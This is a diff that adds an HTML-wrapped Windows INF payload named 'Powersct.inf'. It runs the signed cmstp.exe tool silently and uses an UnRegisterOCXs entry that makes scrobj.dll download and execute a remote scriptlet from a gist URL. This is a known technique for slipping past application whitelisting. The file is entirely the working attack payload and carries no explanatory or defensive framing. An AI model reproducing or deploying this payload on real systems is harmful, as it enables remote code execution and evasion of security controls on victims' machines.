@@ -1,0 +1,21 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Powersct.inf</title>
+</head><body>;cmstp.exe /s cmstp.inf<br/>
+<br/>
+[version]<br/>
+Signature=$chicago$<br/>
+AdvancedINF=2.5<br/>
+<br/>
+[DefaultInstall_SingleUser]<br/>
+UnRegisterOCXs=UnRegisterOCXSection<br/>
+<br/>
+[UnRegisterOCXSection]<br/>
+%11%\scrobj.dll,NI,https://gist.githubusercontent.com/NickTyrer/0604bb9d7bcfef9e0cf82c28a7b76f0f/raw/676451571c203303a95b95fcb29c8b7deb8a66e0/powersct.sct<br/>
+<br/>
+[Strings]<br/>
+AppAct = "SOFTWARE\Microsoft\Connection Manager"<br/>
+ServiceName="Yay"<br/>
+ShortSvcName="Yay"</body></html>
